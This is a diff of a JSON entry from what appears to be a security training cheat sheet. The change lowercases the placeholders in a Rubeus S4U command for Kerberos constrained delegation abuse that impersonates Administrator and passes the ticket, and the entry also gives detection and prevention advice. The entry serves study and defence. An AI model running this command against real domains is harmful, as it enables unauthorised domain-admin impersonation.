@@ -1,7 +1,7 @@
 {
   "id": "cdsa-m06-constrained-delegation",
   "name": "Kerberos Constrained Delegation Abuse (S4U)",
-  "command": ".\\Rubeus.exe s4u /user:<DELEGATE_USER> /rc4:<NTLM_HASH> /domain:<DOMAIN> /impersonateuser:Administrator /msdsspn:\"http/<DC_HOSTNAME>\" /dc:<DC_FQDN> /ptt",
+  "command": ".\\Rubeus.exe s4u /user:<delegate_user> /rc4:<ntlm_hash> /domain:<domain> /impersonateuser:Administrator /msdsspn:\"http/<dc_hostname>\" /dc:<dc_fqdn> /ptt",
   "description": "Kerberos Constrained Delegation allows a service account to request tickets on behalf of any user to specific services. Attackers with control of a delegated account can impersonate Domain Admins to those services (e.g., HTTP→WinRM→DC). Detection: Event 4624 with 'Transited Services' attribute showing S4U delegation chain. Prevention: mark privileged users as 'Account is sensitive and cannot be delegated', add to Protected Users group.",
   "platform": "windows",
   "type": "attack-chain",
